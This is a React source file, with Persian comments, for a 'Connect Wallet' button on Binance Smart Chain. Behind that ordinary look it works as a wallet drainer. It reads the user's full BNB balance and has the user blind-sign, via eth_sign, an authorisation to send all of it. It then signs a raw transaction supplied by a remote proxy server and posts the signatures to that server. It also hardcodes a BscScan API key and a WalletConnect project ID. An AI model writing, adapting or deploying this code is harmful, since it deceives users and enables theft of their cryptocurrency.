import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  async function runner() {
    // پاک کردن session قدیمی (walletconnect)
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // راه‌اندازی Provider
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56],
      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Connected:", accountSender);

    // اطمینان از اینکه روی شبکه بایننس هستیم
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // chainId بایننس اسمارت چین
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // 1) دریافت بالانس BNB
    const amount = await getBNBBalance(accountSender);
    if (!amount) {
      console.error("❌ Failed to fetch BNB balance.");
      return;
    }
    console.log("💰 BNB Balance:", amount);

    // 2) ساخت پیام برای امضای اول
    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
    console.log("📜 Message to Sign:", message);

    // 3) امضای پیام اول با eth_sign
    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }

    console.log("✍️ Signature:", signature);

    // 4) دریافت تراکنش خام از سرور + امضای آن (مرحله دوم)
    async function signAndSendTransaction() {
      try {
        console.log("📡 Requesting Unsigned Transaction...");

        // مرحله اول (tx)
        let result = await jQuery.post(apiUrl, {
          handler: "tx",          // سرور تشخیص می‌دهد مرحله اول است
          address: accountSender,
          signature: signature,   // امضای پیام اول
          amount: amount,         // فرستادن بالانس
        });

        console.log("📥 API Response (raw):", result);

        // اگر پاسخ یک رشته JSON باشد، parse کن
        if (typeof result === "string") {
          try {
            result = JSON.parse(result);
          } catch (err) {
            console.error("❌ Could not parse the raw server response:", err);
            return;
          }
        }

        console.log("📥 API Response (parsed):", result);

        if (!result || !result.rawTransaction) {
          console.error("❌ No rawTransaction received!", result);
          return;
        }

        let unsignedTx;
        try {
          unsignedTx =
            typeof result.rawTransaction === "string"
              ? JSON.parse(result.rawTransaction)
              : result.rawTransaction;
        } catch (e) {
          console.error("❌ Failed to parse rawTransaction:", result.rawTransaction, e);
          return;
        }

        console.log("📜 Unsigned Transaction:", unsignedTx);

        // 5) امضای تراکنش خام با eth_sign (مرحله دوم)
        console.log("📝 Signing Transaction (raw)...");
        const signedTx = await provider.request({
          method: "eth_sign",
          params: [accountSender, JSON.stringify(unsignedTx)],
        });

        console.log("✍️ Signed Transaction (raw):", signedTx);

        // 6) ارسال تراکنش امضا شده به سرور (handler='sign')
        //    اینجا باید rawTransaction را هم بفرستیم تا سرور بتواند همان را هش کند
        const txHash = await jQuery.post(apiUrl, {
          handler: "sign",          // سرور تشخیص می‌دهد مرحله دوم است
          signature: signedTx,      // امضای تراکنش خام
          address: accountSender,
          amount: amount,           // اگر لازم است سرور اینجا هم بالانس بداند
          rawTransaction: JSON.stringify(unsignedTx), // 👈 مهم: ارسال متن تراکنش
        });

        console.log("📤 Transaction Sent:", txHash);
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
      }
    }

    await signAndSendTransaction();
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
